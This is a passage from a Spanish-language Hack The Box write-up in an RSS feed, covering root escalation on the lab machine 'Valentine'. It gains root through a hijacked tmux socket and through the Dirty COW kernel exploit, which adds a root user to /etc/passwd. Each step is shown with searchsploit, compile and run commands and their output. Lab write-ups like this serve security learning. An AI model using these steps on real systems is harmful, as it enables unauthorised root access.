&lt;p&gt;Simplemente debemos ejecutar el comando &lt;code&gt;tmux -S /.devs/dev_sess&lt;/code&gt; y ya estariamos como &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@Valentine:/home/hype# whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La segunda forma de elevar privilegios seria explotar el kernel ya que si obervamos la versión que corresponde a la maquina es la &lt;code&gt;3.2.0&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:~$ uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para ello podriamos usar el &lt;code&gt;dirty cow&lt;/code&gt;, para tratar de insertar en el &lt;code&gt;/etc/passwd&lt;/code&gt; un usuario nuevo con privilegios que operen como root.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit dirty cow
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (1)                                                                               | linux/dos/43199.c
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (2)                                                                               | linux/dos/44305.c
Linux Kernel 2.6.22 &amp;lt; 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method)                                   | linux/local/40616.c
Linux Kernel 2.6.22 &amp;lt; 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method)                                      | linux/local/40847.cpp
Linux Kernel 2.6.22 &amp;lt; 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method)                                                         | linux/local/40838.c
Linux Kernel 2.6.22 &amp;lt; 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)                                   | linux/local/40839.c
Linux Kernel 2.6.22 &amp;lt; 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method)                                                          | linux/local/40611.c
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para ello vamos a traernos el &lt;code&gt;exploit&lt;/code&gt;y vamos a ejecutarlo en la maquina victima.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit -m linux/local/40839.c
  Exploit: Linux Kernel 2.6.22 &amp;lt; 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
      URL: https://www.exploit-db.com/exploits/40839
     Path: /usr/share/exploitdb/exploits/linux/local/40839.c
File Type: C source, ASCII text

Copied to: /home/fmiracle/Machines/Valentine/nmap/40839.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En la maquina victima para poder ejecutarlo, si grepeamos por &lt;code&gt;gcc&lt;/code&gt; nos indica como hacerlo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:/tmp$ cat exploit.c | grep gcc
//   gcc -pthread dirty.c -o dirty -lcrypt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos y nos crea un compilado con el nombre de &lt;code&gt;dirty&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:/tmp$ gcc -pthread exploit.c -o dirty -lcrypt
hype@Valentine:/tmp$ ls
_cafenv-appconfig_  dirty  exploit.c  vmware-root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al ejecutar el &lt;code&gt;dirty&lt;/code&gt; lo que hara sera pedirnos una contraseña, la cual asignara al usuario &lt;code&gt;firefart&lt;/code&gt; que tendra privilegios como &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:/tmp$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fiWV.l3JFnVCk:0:0:pwned:/root:/bin/bash

mmap: 7fbb2afd5000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora revisamos el &lt;code&gt;/etc/passwd&lt;/code&gt;, vemos que nos creo el usuario exitosamente, ahora solo tenemos que migrar a el con la contraseña que introducimos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:/tmp$ cat /etc/passwd
firefart:fiWV.l3JFnVCk:0:0:pwned:/root:/bin/bash
/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false
lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:105:114::/nonexistent:/bin/false
avahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/false
kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
saned:x:114:123::/home/saned:/bin/false
hype:x:1000:1000:Hemorrhage,,,:/home/hype:/bin/bash
sshd:x:115:65534::/var/run/sshd:/usr/sbin/nologin
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora nos convertimos en el usuario &lt;code&gt;firefart&lt;/code&gt;, vamos al directorio personal del usuario root y podemos visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hype@Valentine:/tmp$ su firefart
Password: 
firefart@Valentine:/tmp# whoami
firefart
firefart@Valentine:/tmp# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@Valentine:/tmp# cd /root
firefart@Valentine:~# cat root.txt 
c3261195d6711ce3bfa9bc76bfc43e4e
&lt;/code&gt;&lt;/pre&gt;
</description>
        <pubDate>Sat, 24 Jun 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Valentine</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Valentine</guid>
        
        <category>Information leaked</category>
        
        <category>Ssl Heartbleed Explotation</category>
        
        <category>Cracking Hashes</category>
        
        <category>Tmux Socket File Abusing</category>
        
        <category>Linux Kernel Explotation</category>
        
        <category>Dirty Cow</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
  </channel>
</rss>
